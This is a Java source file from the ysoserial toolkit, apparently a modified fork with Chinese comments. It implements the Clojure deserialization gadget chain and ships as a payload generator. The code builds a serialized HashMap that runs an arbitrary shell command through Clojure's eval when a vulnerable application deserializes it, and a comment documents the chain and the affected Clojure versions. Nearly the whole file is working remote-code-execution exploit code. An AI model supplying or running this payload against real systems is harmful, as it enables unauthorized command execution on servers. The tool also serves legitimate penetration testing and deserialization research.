package ysoserial.payloads;

import clojure.inspector.proxy$javax.swing.table.AbstractTableModel$ff19274a;
import clojure.lang.PersistentArrayMap;
import ysoserial.Strings;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;

import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

/*
	Gadget chain:
		ObjectInputStream.readObject()
			HashMap.readObject()
				AbstractTableModel$ff19274a.hashCode()
					clojure.core$comp$fn__4727.invoke()
						clojure.core$constantly$fn__4614.invoke()
						clojure.main$eval_opt.invoke()

	Requires:
		org.clojure:clojure
		Versions since 1.2.0 are vulnerable, although some class names may need to be changed for other versions
 */
@Dependencies({"org.clojure:clojure:1.8.0"})
@Authors({Authors.JACKOFMOSTTRADES})
public class Clojure extends PayloadRunner implements ObjectPayload<Map<?, ?>> {
    //    hashmap的readobject()反序列化里，是会对key进行hashcode()，所以可以存入一个类对象的自定义的hashcode方法钟存在危险操作的对象。这里使用的是AbstractTableModel$ff19274a对象里的hashcode
//    AbstractTableModel$ff19274a的hashcode里有存在invoke反射对象操作
    public Map<?, ?> getObject(final String command) throws Exception {

//		final String[] execArgs = command.split(" ");
//		final StringBuilder commandArgs = new StringBuilder();
//		for (String arg : execArgs) {
//			commandArgs.append("\" \"");
//			commandArgs.append(arg);
//		}
//		commandArgs.append("\"");


//		final String clojurePayload =
//				String.format("(use '[clojure.java.shell :only [sh]]) (sh %s)", commandArgs.substring(2));

        String cmd = Strings.join(Arrays.asList(command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\").split(" ")), " ", "\"", "\"");

        final String clojurePayload =
            String.format("(use '[clojure.java.shell :only [sh]]) (sh %s)", cmd);


        Map<String, Object> fnMap = new HashMap<>();
        AbstractTableModel$ff19274a model = new AbstractTableModel$ff19274a();
//        fnMap.put("hashCode", new clojure.core$constantly().invoke(0));


//        model.__initClojureFnMappings(PersistentArrayMap.create(fnMap));

        HashMap<Object, Object> targetMap = new HashMap<>();
        targetMap.put(model, null);

        fnMap.put("hashCode",
            new clojure.core$comp().invoke(
                new clojure.main$eval_opt(),
                new clojure.core$constantly().invoke(clojurePayload)));
        model.__initClojureFnMappings(PersistentArrayMap.create(fnMap));

        return targetMap;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(Clojure.class, args);
    }

}
